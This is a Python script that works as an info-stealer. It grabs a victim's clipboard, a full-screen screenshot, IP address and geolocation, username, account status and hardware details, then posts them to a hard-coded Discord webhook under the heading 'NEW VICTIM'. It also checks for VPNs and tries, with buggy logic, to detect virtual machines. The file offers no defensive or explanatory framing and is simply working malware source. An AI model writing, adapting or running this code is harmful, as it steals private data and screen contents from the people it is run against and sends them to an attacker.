import os
import re
import json
import platform as pl
import requests
import locale
import getpass
import winreg
import psutil
import socket
import wmi
import re
import subprocess
import platform
import pyperclip
from PIL import ImageGrab
import io
from re import findall
from urllib.request import Request, urlopen

# your webhook URL
WEBHOOK_URL = 'https://discord.com/api/webhooks/1077368044524941352/R72yU15Zzu_AnL4YdHAK9oWYtTL5nojoVBDlmckjwuqWx5L--CroBgfVTH5WnCK7YhE8'

# mentions you when you get a hit
PING_ME = True

# Get system language
language, encoding = locale.getlocale()

# Get current user's name
username = getpass.getuser()
message = ""

# Get the local IP address
local_ip_address = socket.gethostbyname(socket.gethostname())

c = wmi.WMI()
microsoft = "Unknown"

# Get clipboard
clipboard = pyperclip.paste()

vpnresult = ''

username = getpass.getuser()
#print("Username:", username)
username_warn = ''
if username == 'WDAGUtilityAccount' or 'User' or 'Default' or 'Root' or 'System' or 'Administrator' or 'Guest' or 'DefaultAccount':
    username_warn = (f'Script is being ran on an account commonly used on VMs') 
else:
    username_warn = 'False'
    
    

# CPU information
cpu_count = psutil.cpu_count()
cpu_freq = psutil.cpu_freq().current
cpu_percent = psutil.cpu_percent()

# Memory information
mem_total = psutil.virtual_memory().total
mem_available = psutil.virtual_memory().available
mem_percent = psutil.virtual_memory().percent

# Disk information
disk_usage = psutil.disk_usage('/')

# GPU information
try:
    cpuinfo = subprocess.check_output(['cat', '/proc/cpuinfo']).decode()
    model_name_match = re.search(r'model name\s+:\s+(.*)', cpuinfo, flags=re.IGNORECASE)
    if model_name_match:
        cpu_model = model_name_match.group(1)
    else:
        cpu_model = "Unknown CPU model"
except (FileNotFoundError, subprocess.CalledProcessError):
    cpu_model = "Unknown CPU model"

# CPU model
w = wmi.WMI()
for processor in w.Win32_Processor():
    cpu_model = processor.Name.strip()
    break
else:
    cpu_model = "Unknown CPU model"

# GPU information
try:
    import GPUtil
    gpus = GPUtil.getGPUs()
    gpu_model = gpus[0].name
except:
    gpu_model = "No GPU found"

w = wmi.WMI()
microsoft = False
for account in w.Win32_Account():
    if account.SID.startswith("S-1-5-21-") and "MicrosoftAccount" in account.SID:
        microsoft = True
        break

if microsoft:
    microsoft = "Microsoft account found."
else:
    microsoft = "Microsoft account not found."




def get_ip_info_dump():
    response = requests.get("https://ipinfo.io/json")
    data = response.json()
    return data






ip_address = requests.get('https://api.ipify.org').text
API_Key = ('')
if API_Key == '':
    print('Please enter your API key\nGet it on https://vpnapi.io/\n\nLook at line 121\n')
    quit()
Securl = f"https://vpnapi.io/api/{ip_address}?key={API_Key}"
response2 = requests.get(Securl)
data = response2.json()
    
vpn_status = (data['security']['vpn'])
proxy_status = (data['security']['proxy'])
tor_status = (data['security']['tor'])
relay_status = (data['security']['relay'])
    



    



def main():

    # Take screenshot of entire screen
    screenshot = ImageGrab.grab()

    # Save screenshot to a buffer
    buffer = io.BytesIO()
    screenshot.save(buffer, format="PNG")
    buffer.seek(0)

    # IP info dump
    ip_info = get_ip_info_dump()

    # Send message
    if not (relay_status or proxy_status or tor_status or vpn_status):
       message = (f'----------------------------------**NEW MESSAGE**--------------------------------------------------------\n\n\n'
           f'<@515402023223427072>\n'
           f'**NEW VICTIM**\n\n'
           f'**Device**\n```'
           f'Virtual Machine: {username_warn}\n'
           f'Device Info: {pl.uname()}\n'
           f'Device IP: {ip_address}\n'
           f'Local IP: {local_ip_address}\n'
           f'System language: {language}\n'
           f'Current user: {username}\n'
           f'Account Status: {microsoft}```\n'
           f'**Clipboard**\n```Clipboard: {clipboard}```\n\n'
           f'**IP Address Dump**\n```'
           f'Device IP: {ip_info["ip"]}\n'
           f'City: {ip_info["city"]}\n'
           f'Region: {ip_info["region"]}\n'
           f'Country: {ip_info["country"]}\n'
           f'Postal code: {ip_info["postal"]}\n'
           f'Timezone: {ip_info["timezone"]}\n'
           f'Organization: {ip_info["org"]}\n'
           f'Coordinates: {ip_info["loc"]}```\n\n'
           f'**Security Info**\n```'
           f'VPN: {vpn_status}\n'
           f'Proxy: {proxy_status}\n'
           f'Tor: {tor_status}\n'
           f'Relay: {relay_status}```\n'
           f'**Hardware Info**```'
           f'CPU Model: {cpu_model}\n'
           f'CPU Count: {cpu_count}\n'
           f'CPU Frequency: {cpu_freq}\n'
           f'CPU Usage: {cpu_percent}%\n'
           f'GPU Model: {gpu_model}\n'
           f'Total Memory: {mem_total}\n'
           f'Available Memory: {mem_available}\n'
           f'Memory Usage: {mem_percent}%\n'
           f'Disk Usage: {disk_usage}```'
          )

    else:
        message = (f'----------------------------------**NEW MESSAGE**--------------------------------------------------------\n\n\n'
           f'<@515402023223427072>\n'
           f'**NEW VICTIM**\n\n'
           f'**Device**\n```'
           f'Virtual Machine: {username_warn}\n'
           f'Device Info: {pl.uname()}\n'
           f'Device IP: {ip_address} ⚠️VPN Detected\n'
           f'Local IP: {local_ip_address}\n'
           f'System language: {language}\n'
           f'Current user: {username}\n'
           f'Account Status: {microsoft}```\n'
           f'**Clipboard**\n```Clipboard: {clipboard}```\n\n'
           f'**IP Address Dump**⚠️\n```'
           f'Device IP: {ip_info["ip"]} ⚠️VPN Detected\n'
           f'City: {ip_info["city"]} ⚠️VPN Detected\n'
           f'Region: {ip_info["region"]} ⚠️VPN Detected\n'
           f'Country: {ip_info["country"]} ⚠️VPN Detected\n'
           f'Postal code: {ip_info["postal"]} ⚠️VPN Detected\n'
           f'Timezone: {ip_info["timezone"]} ⚠️VPN Detected\n'
           f'Organization: {ip_info["org"]}\n'
           f'Coordinates: {ip_info["loc"]} ⚠️VPN Detected```\n\n'
           f'**Security Info**\n```'
           f'VPN: {vpn_status}\n'
           f'Proxy: {proxy_status}\n'
           f'Tor: {tor_status}\n'
           f'Relay: {relay_status}\n```\n'
           f'**Hardware Info**```'
           f'CPU Model: {cpu_model}\n'
           f'CPU Count: {cpu_count}\n'
           f'CPU Frequency: {cpu_freq}\n'
           f'CPU Usage: {cpu_percent}%\n'
           f'GPU Model: {gpu_model}\n'
           f'Total Memory: {mem_total}\n'
           f'Available Memory: {mem_available}\n'
           f'Memory Usage: {mem_percent}%\n'
           f'Disk Usage: {disk_usage}```'
          )


    message_payload = {'content': message}
    message_headers = {"Content-Type": "application/json"}
    try:
        message_response = requests.post(WEBHOOK_URL, headers=message_headers, json=message_payload)
        message_response.raise_for_status()
        print("Message sent successfully")
    except requests.exceptions.RequestException as e:
        print("Error sending message:", e)

    # Define message text
    message_text = "Here's a screenshot:"

    # Send message with screenshot
    message_payload = {
        'content': message_text,
        'file': ('screenshot.png', buffer, 'image/png')
    }
    message_headers = {
        'Content-Type': 'multipart/form-data'
    }
    try:
        message_response = requests.post(WEBHOOK_URL, headers=message_headers, files=message_payload)
        message_response.raise_for_status()
        print("Message sent successfully")
    except requests.exceptions.RequestException as e:
        print("Error sending message:", e)
        if hasattr(e.response, 'text'):
            print("Error response:", e.response.text)
        quit()


if __name__ == '__main__':
    main()